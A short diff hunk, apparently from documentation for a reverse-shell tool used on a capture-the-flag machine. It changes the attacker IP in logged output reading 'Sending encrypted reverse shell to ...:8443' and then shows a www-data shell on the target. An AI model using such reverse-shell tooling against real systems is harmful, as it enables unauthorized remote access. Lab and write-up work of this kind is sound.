@@ -26,7 +26,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 [*] Killing Webserver process
 [*] Starting reverse shell handler on tty /dev/pts/1
 [*] Paste CMD: export TERM=screen; stty rows 59 cols 116
-[*] Sending encrypted reverse shell to 10.13.42.125:8443
+[*] Sending encrypted reverse shell to 10.13.21.200:8443
 <www/html$ export TERM=screen; stty rows 59 cols 116
 www-data@year-of-the-dog:/var/www/html$ pwd
 /var/www/html
